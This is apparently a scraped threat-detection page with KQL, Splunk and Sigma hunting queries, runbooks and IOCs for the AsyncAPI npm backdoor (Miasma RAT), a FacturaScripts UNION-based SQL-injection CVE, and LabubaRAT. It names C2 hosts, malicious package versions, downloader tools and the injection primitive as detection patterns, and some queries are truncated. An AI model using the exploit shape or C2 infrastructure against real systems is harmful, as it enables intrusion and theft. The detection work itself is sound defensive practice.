On July 14, 2026 at 07:10 UTC, three packages in the AsyncAPI generator monorepo (@asyncapi/generator@3.3.1, @asyncapi/generator-helpers@1.1.1, and @asyncapi/generator-components@0.7.1) were published to npm carrying an obfuscated dropper that fires the moment the library is loaded, not on install. The packages were published through the project's own legitimate GitHub Actions release workflow and carry valid npm OIDC provenance attestations, because the attacker didn't steal an npm token: they gained push access to the repository's next branch and let the project's real CI/CD pipeline do the …

Malicious @asyncapi generator/specs package versions installed (Miasma supply chain) AIInstallation High
Hunts npm/yarn/pnpm install or lockfile references to the exact backdoored AsyncAPI package versions published on 2026-07-14 (@asyncapi/generator@3.3.1, generator-helpers@1.1.1, generator-components@0.7.1, specs@6.11.2). These versions carry an obfuscator.io dropper that fires on library load and pulls Miasma RAT from IPFS. Rationale: Anchored on the four exact malicious package@version strings from the article's affected-packages table; these fixed version pins are unambiguous IOCs — no legitimate install would request the yanked backdoored versions once advisories landed. Cross-checked against: • https://socket.dev/blog/asyncapi-supply-chain-attack • https://safedep.io/asyncapi-generator-supply-chain-attack-miasma-rat/ • https://research.jfrog.com/post/miasma-worm-returns-to-npm/
ATT&CKT1195.002
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Internal mirror/registry proxy warmup pulling the version to quarantine it for analysis
  • Security researcher intentionally reproducing the attack in a sandbox
  • CI cache-cleanup job that logs old resolved versions in a lockfile diff
  • Vulnerability-scanner remediation tooling echoing the bad version in a report command line
Response runbook
1) TRIAGE: Confirm the host actually resolved the malicious version (check node_modules/@asyncapi/*/package.json and lockfile) versus merely logging the string in a scanner report; capture the initiating user and CI job. 2) CONTAIN: Isolate the host/runner, kill any node.exe/detached child, revoke and rotate any npm/GitHub/AWS/SSH credentials reachable from that environment (Miasma is a credential stealer). 3) HUNT: Pivot to the C2 and drop-path UCs — search DeviceNetworkEvents for 85.137.53.71 and DeviceFileEvents for sync.js under a NodeJS directory on the same DeviceId within 24h.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has_any ("@asyncapi/generator@3.3.1","@asyncapi/generator-helpers@1.1.1","@asyncapi/generator-components@0.7.1","@asyncapi/specs@6.11.2")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent

| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

Miasma RAT HTTP C2 beacon to 85.137.53.71 AICommand & Control Medium
Hunts outbound connections to the StepSecurity-confirmed Miasma RAT command server 85.137.53.71 (ports 8080/8081/8091), the primary HTTP C2 for the AsyncAPI supply-chain payload dropped as sync.js. Any host reaching this IP is post-compromise. Rationale: 85.137.53.71 is the single confirmed HTTP C2 IP — StepSecurity observed the egress attempt directly with Harden-Runner and multiple vendors (Wiz, Socket) list the same IP on ports 8080/8081/8091, so a hardcoded-IP match is near-zero-FP. Cross-checked against: • https://www.wiz.io/blog/m-red-team-asyncapi-supply-chain-compromise-via-github-actions • https://socket.dev/blog/asyncapi-supply-chain-attack • https://safedep.io/asyncapi-generator-supply-chain-attack-miasma-rat/
ATT&CKT1071.001
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel or sandbox detonation VM deliberately contacting the C2 for analysis
  • Firewall/IDS honeypot logging blocked outbound attempts to the same IP (verify DvcAction=Deny)
  • Security scanner probing the IP for takedown confirmation
Response runbook
1) TRIAGE: Identify the InitiatingProcess (expect node.exe or a detached child from a NodeJS profile dir) and confirm the connection succeeded vs was blocked by the firewall. 2) CONTAIN: Isolate the host, block 85.137.53.71 org-wide at egress, terminate the node process, and snapshot memory before reimage. 3) HUNT: Sweep all hosts/runners for the malicious @asyncapi versions and for sync.js drops; rotate every credential the compromised runner could touch (npm, GitHub, AWS, SSH, crypto wallets).
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP == "85.137.53.71"
| project Timestamp, DeviceName, RemoteIP, RemotePort, Protocol, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where DstIpAddr == "85.137.53.71"
| project TimeGenerated, DvcHostname, SrcIpAddr, DstIpAddr, DstPortNumber, NetworkApplicationProtocol, DvcAction
| order by TimeGenerated desc

Miasma dropper writes sync.js into hidden NodeJS profile directory AIInstallation High
Hunts the Miasma second-stage drop: a file named sync.js written into an OS-specific hidden 'NodeJS' directory in the user profile by a node process, immediately before it is spawned detached and hidden. This is the persistence artifact common to both AsyncAPI attacks despite different IPFS CIDs. Rationale: The article and JFrog/Socket write-ups agree the drop is a fixed filename sync.js placed in a hidden NodeJS directory in the user profile by node itself — the filename+directory+writing-process triad is behaviourally specific to Miasma and survives the differing IPFS CIDs between the two attacks. Cross-checked against: • https://research.jfrog.com/post/miasma-worm-returns-to-npm/ • https://socket.dev/blog/asyncapi-supply-chain-attack
ATT&CKT1564.001 T1059.007
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate tool named 'sync.js' inside an unrelated project folder that happens to contain 'NodeJS' in its path (verify it is the profile/appdata NodeJS dir, not a repo)
  • Developer manually creating a script called sync.js under a NodeJS-named workspace
  • Node-based backup/sync utility writing its own sync.js state file
Suppression filter
| where InitiatingProcessCommandLine !has "backup" and FolderPath !has "\\source\\" and FolderPath !has "\\repos\\"
Response runbook
1) TRIAGE: Hash the dropped sync.js and compare to the article SHA256 set; confirm the parent chain shows node loading one of the backdoored @asyncapi packages. 2) CONTAIN: Isolate host, kill the detached hidden node child, delete the NodeJS dir persistence, and rotate credentials reachable from the host. 3) HUNT: Look for the follow-on C2 to 85.137.53.71 and the BitTorrent-DHT/Nostr fallback egress from the same node process; check other repos/runners for the same package versions.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "sync.js"
| where FolderPath has "NodeJS"
| where InitiatingProcessFileName in~ ("node.exe","node")
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent

| where TargetFileName =~ "sync.js"
| where TargetFilePath has "NodeJS"
| where ActingProcessName has "node"
| project TimeGenerated, DvcHostname, TargetFilePath, TargetFileName, ActingProcessName, ActingProcessCommandLine, TargetFileSHA256
| order by TimeGenerated desc

Miasma RAT fallback-channel egress: BitTorrent DHT / Nostr relays from Node AICommand & Control Medium
Hunts the Miasma RAT resilience channels — DNS/connections to BitTorrent DHT bootstrap nodes (router.bittorrent.com, dht.transmissionbt.com) and Nostr relays (relay.damus.io, relay.nostr.com) originating from a node process. These are fallback C2/update channels the standard Miasma worm lacks and are highly abnormal from server/CI Node runtimes. Rationale: The four fallback domains are enumerated in Harden-Runner egress capture and corroborated by SafeDep/JFrog as Miasma's resilient discovery channels; scoping to a node.exe initiator suppresses the legitimate torrent-client noise that would otherwise dominate these well-known bootstrap hosts. Cross-checked against: • https://safedep.io/asyncapi-generator-supply-chain-attack-miasma-rat/ • https://research.jfrog.com/post/miasma-worm-returns-to-npm/
ATT&CKT1008 T1095
Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A developer workstation running a legitimate BitTorrent client (qBittorrent/Transmission) that also has Node installed — verify the initiating process is node.exe, not the torrent client
  • A p2p/WebTorrent Node application legitimately using bittorrent-dht
  • A Nostr-based dev tool or relay client written in Node
  • IPFS/libp2p Node nodes bootstrapping via the same DHT
Suppression filter
| where InitiatingProcessFolderPath !has "qbittorrent" and InitiatingProcessFolderPath !has "transmission" and InitiatingProcessCommandLine !has "webtorrent"
Response runbook
1) TRIAGE: Confirm the initiating process is node.exe running from or spawned by a NodeJS profile directory (not a sanctioned WebTorrent/Nostr app); correlate with sync.js drop and 85.137.53.71 on the same host. 2) CONTAIN: If tied to the drop artifact, isolate the host, kill the node child, block the fallback domains and C2 IP, rotate credentials. 3) HUNT: Pivot on the host's node_modules for the backdoored @asyncapi versions and enumerate other runners that pulled the same lockfile.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl in~ ("router.bittorrent.com","dht.transmissionbt.com","relay.damus.io","relay.nostr.com")
| where InitiatingProcessFileName in~ ("node.exe","node")
| project Timestamp, DeviceName, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath
| order by Timestamp desc
ImDnsActivity
| where TimeGenerated > ago(30d)
| where DnsQuery in~ ("router.bittorrent.com","dht.transmissionbt.com","relay.damus.io","relay.nostr.com")
| project TimeGenerated, DvcHostname, SrcIpAddr, DnsQuery, DnsResponseName
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.

| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")

     | `drop_dm_object_name(Processes)`

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("6e78713b75bd34828d49896176627f7face7aa9036cd874f2e02d9f23a9a9c71", "b270bdf8e2274ea1af0a6eed74d8f10e5fe61012d6cc226a43cc7cc7fd9f6292", "24b9ee242f21a73b55f7bb3297eafb33c60840907386b542ed79fc6b72365168") or SHA1 in~ ("6e78713b75bd34828d49896176627f7face7aa9036cd874f2e02d9f23a9a9c71", "b270bdf8e2274ea1af0a6eed74d8f10e5fe61012d6cc226a43cc7cc7fd9f6292", "24b9ee242f21a73b55f7bb3297eafb33c60840907386b542ed79fc6b72365168") or MD5 in~ ("6e78713b75bd34828d49896176627f7face7aa9036cd874f2e02d9f23a9a9c71", "b270bdf8e2274ea1af0a6eed74d8f10e5fe61012d6cc226a43cc7cc7fd9f6292", "24b9ee242f21a73b55f7bb3297eafb33c60840907386b542ed79fc6b72365168")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("6e78713b75bd34828d49896176627f7face7aa9036cd874f2e02d9f23a9a9c71", "b270bdf8e2274ea1af0a6eed74d8f10e5fe61012d6cc226a43cc7cc7fd9f6292", "24b9ee242f21a73b55f7bb3297eafb33c60840907386b542ed79fc6b72365168") or SHA1 in~ ("6e78713b75bd34828d49896176627f7face7aa9036cd874f2e02d9f23a9a9c71", "b270bdf8e2274ea1af0a6eed74d8f10e5fe61012d6cc226a43cc7cc7fd9f6292", "24b9ee242f21a73b55f7bb3297eafb33c60840907386b542ed79fc6b72365168") or MD5 in~ ("6e78713b75bd34828d49896176627f7face7aa9036cd874f2e02d9f23a9a9c71", "b270bdf8e2274ea1af0a6eed74d8f10e5fe61012d6cc226a43cc7cc7fd9f6292", "24b9ee242f21a73b55f7bb3297eafb33c60840907386b542ed79fc6b72365168")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["6e78713b75bd34828d49896176627f7face7aa9036cd874f2e02d9f23a9a9c71", "b270bdf8e2274ea1af0a6eed74d8f10e5fe61012d6cc226a43cc7cc7fd9f6292", "24b9ee242f21a73b55f7bb3297eafb33c60840907386b542ed79fc6b72365168"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] FacturaScripts REST API filter UNION-based SQLi (CVE-2026-45262) · [LLM] FacturaScripts /api/3 filter key contains parenthesis (sqlColumn escape bypass primitive)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-45262: FacturaScripts: Authenticated SQL injection in
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] FacturaScripts SQLi followed by admin panel access from same source (account takeover)
FacturaScripts REST API filter UNION-based SQLi (CVE-2026-45262) AIExploitation High
Hunts for the CVE-2026-45262 exploitation request against a FacturaScripts install: a GET to /api/3/<resource> (or /api/3/attachedfiles) whose filter[] key carries a UNION SELECT payload wrapped in parentheses to bypass Where::sqlColumn identifier escaping. This is the exact primitive used to dump the users table (password hash + logkey) from a read-only ApiKey. Rationale: Keys on the article's exact exploitation shape: /api/3/ route + filter[] key containing parenthesis-wrapped UNION SELECT (the only way to reach the sqlColumn early-return). UNION+SELECT letters are never URL-encoded so they survive raw in access logs, making this a very high-fidelity signature. Cross-checked against: • https://www.sentinelone.com/vulnerability-database/cve-2026-25513/ • https://www.sentinelone.com/vulnerability-database/cve-2026-25514/ • https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-g6w2-q45f-xrp4
ATT&CKT1190 T1212
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorised penetration test / sqlmap run against the FacturaScripts instance
  • Vulnerability scanner (Nessus/Qualys/Burp) probing the REST API with generic SQLi payloads
  • A legitimate integration accidentally sending a column expression containing the words 'union'/'select' in a filter value (rare — filter keys are column names, not free text)
  • Security researcher reproducing the public PoC in a staging environment
Suppression filter
| where not(RequestClientApplication has_any ("sqlmap","Nessus","Nikto","Burp"))
Response runbook
1) Triage: pull the full RequestURL and SourceIP; URL-decode the filter key and confirm it contains `(`,`)` and a UNION SELECT against a sensitive table (users). Check the response size/status — a 200 with a large body indicates successful extraction. 2) Contain: block the SourceIP at the WAF/reverse proxy, rotate ALL user logkey cookies and force re-auth, and rotate/disable the ApiKey used (audit `ApiKey`/`ApiAccess` rows for scoped-but-abused tokens). Upgrade FacturaScripts to the patched release. 3) Hunt: from the same SourceIP/ApiKey, search for follow-on access to /AdminPlugins or other Admin* controllers (see correlated UC), and review any /api/3/attachedfiles requests using the same primitive.
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where isnotempty(RequestURL)
| where RequestURL has "/api/3/"
| where RequestURL has "filter"
| where RequestURL has "union" and RequestURL has "select"
| where RequestURL has_any ("%28","(") and RequestURL has_any ("%29",")")
| project TimeGenerated, SourceIP, DestinationHostName, RequestMethod, RequestURL, RequestClientApplication, DeviceVendor, DeviceProduct
| order by TimeGenerated desc
title: FacturaScripts REST API filter UNION-based SQL injection (CVE-2026-45262)
id: 2afcef3d-addf-446a-bc0a-694ccd118528
status: experimental
description: Detects UNION-based SQL injection against the FacturaScripts /api/3 REST API filter parameter, bypassing Where::sqlColumn escaping via parenthesised identifiers.
references:
  - https://github.com/advisories/GHSA-5qmh-x653-g8qj
  - https://www.sentinelone.com/vulnerability-database/cve-2026-25513/
author: SOC Detection Engineering
date: 2026/07/14
tags:
  - attack.t1190
  - attack.t1212
  - attack.initial_access
logsource:
  category: webserver
detection:
  selection_route:
    cs-uri-stem|contains: '/api/3/'
  selection_inj:
    cs-uri-query|contains|all:
      - 'filter'
      - 'UNION'
      - 'SELECT'
  condition: selection_route and selection_inj
falsepositives:
  - Web application security scanners (Burp, sqlmap, Nessus) probing the API
level: high

FacturaScripts /api/3 filter key contains parenthesis (sqlColumn escape bypass primitive) AIExploitation Medium
Broader hunt for the CVE-2026-45262 bypass primitive independent of payload: any /api/3 filter[] key that contains both '(' and ')' triggers the vulnerable early-return in Where::sqlColumn that skips identifier escaping. Catches blind/boolean and non-UNION SQLi variants the UNION-specific rule misses, since a legitimate filter key is only ever a bare column name. Rationale: Targets the structural root cause (parenthesis in a filter key), which the article names as the sole precondition to reach the raw-concatenation branch. Legitimate filter keys are plain column identifiers, so a parenthesised key is inherently anomalous and this catches SQLi that does not use UNION. Cross-checked against: • https://www.sentinelone.com/vulnerability-database/cve-2026-25513/ • https://www.sentinelone.com/vulnerability-database/cve-2026-25514/
ATT&CKT1190 T1212
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Automated SQLi scanner fuzzing filter keys with malformed input
  • A custom integration built by a developer who mistakenly encoded a LOWER()/expression column into a filter key rather than a filter value
  • Penetration test enumerating the filter parameter
  • WAF that rewrites/normalises URLs and injects encoded parentheses into logged query strings
Suppression filter
| where not(RequestURL matches regex @"(?i)filter(\[|%5b)(lower|upper|integer):[a-z0-9_]+(\)|%29)=")
Response runbook
1) Triage: URL-decode the filter key and inspect what sits between the parentheses — a bare column name is likely benign, SQL keywords (SELECT/SLEEP/AND/OR/CASE) or comment sequences (`-- `) confirm exploitation. Correlate the SourceIP with the ApiKey/session in application logs. 2) Contain: block the SourceIP, disable the offending ApiKey, and rotate user logkeys if any extraction succeeded; apply the FacturaScripts patch. 3) Hunt: pivot on the SourceIP for time-based blind indicators (repeated near-identical requests with varying sleep values) and for the same key pattern on /api/3/attachedfiles.
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where isnotempty(RequestURL)
| where RequestURL has "/api/3/"
| where RequestURL has "filter"
| where RequestURL matches regex @"(?i)filter(\[|%5b)[^=&]*(\(|%28)[^=&]*(\)|%29)"
| project TimeGenerated, SourceIP, DestinationHostName, RequestMethod, RequestURL, RequestClientApplication, DeviceVendor, DeviceProduct
| order by TimeGenerated desc

FacturaScripts SQLi followed by admin panel access from same source (account takeover) AIActions on Objectives Medium
Correlates the CVE-2026-45262 SQLi request against a subsequent hit to the FacturaScripts /AdminPlugins admin controller from the same source IP within a short window — the exact takeover chain in the advisory where a leaked admin logkey was replayed to reach /AdminPlugins (HTTP 200). Surfaces successful exploitation escalating from a read-only token to admin UI access. Rationale: Directly models the advisory's end-to-end takeover: read-only ApiKey SQLi on /api/3 followed by admin access on /AdminPlugins from the same SourceIP. The two-event correlation (both named routes, same source, tight window) is far higher fidelity than either endpoint alone. Cross-checked against: • https://www.sentinelone.com/vulnerability-database/cve-2026-25514/
ATT&CKT1539 T1078
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A legitimate admin who happens to be behind the same NAT/proxy egress IP as an API client (shared corporate egress collapses SourceIP)
  • Load balancer or WAF that rewrites all SourceIP values to a single upstream address, causing every request to share an IP
  • Internal monitoring/health-check tooling that touches both the API and admin routes
  • Authorised pentester who chains the full PoC during a scheduled test
Response runbook
1) Triage: confirm the /api/3 request in the pair actually carried a SQLi payload (not a benign parenthesis) and that the /AdminPlugins hit returned 200 — this indicates a valid (stolen) admin logkey. Identify the admin account whose logkey was likely replayed. 2) Contain: invalidate all logkey sessions (force global re-login), disable the abused ApiKey and the compromised admin account, block the SourceIP, and patch FacturaScripts. 3) Hunt: review all admin controllers (Admin*, plugin install/upload, settings changes) touched by that SourceIP/session, check for newly installed plugins or config changes as persistence, and inspect DB for unauthorised user/ApiKey creation.
let lookback = 7d;
let window = 30m;
let inj = CommonSecurityLog
    | where TimeGenerated > ago(lookback)
    | where RequestURL has "/api/3/"
    | where RequestURL matches regex @"(?i)filter(\[|%5b)[^=&]*(\(|%28)[^=&]*(\)|%29)"
    | project InjTime = TimeGenerated, SourceIP, InjURL = RequestURL;
CommonSecurityLog
| where TimeGenerated > ago(lookback)
| where RequestURL has "/AdminPlugins"
| project AdminTime = TimeGenerated, SourceIP, AdminURL = RequestURL, RequestClientApplication
| join kind=inner inj on SourceIP
| where AdminTime between (InjTime .. InjTime + window)
| project InjTime, AdminTime, DelayMin = datetime_diff('minute', AdminTime, InjTime), SourceIP, InjURL, AdminURL, RequestClientApplication
| order by AdminTime desc

Fake NVIDIA runtime (nvidia-sysruntime.exe) launched with LabubaRAT C2 config args AIInstallation High
Hunts execution of the LabubaRAT loader nvidia-sysruntime.exe when its command line carries the runtime C2 configuration — either the plaintext server pipicka.xyz or a single long Base64-encoded argument. LabubaRAT does not hard-code its C2, so the config appears on the process command line at launch, making this the sharpest first-stage pivot. Rationale: Uses the article's exact loader name nvidia-sysruntime.exe plus the C2 domain pipicka.xyz and the described Base64 single-argument config vector; no legitimate NVIDIA binary carries this name so both the name and the config-on-cmdline are high fidelity. Single-source (Blackpoint Cyber via THN) — no second corroborating source found.
ATT&CKT1036.005 T1059 T1140
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher or malware analyst detonating the sample in a lab VM enrolled in EDR
  • Red-team engagement replaying LabubaRAT-style loaders with placeholder config args
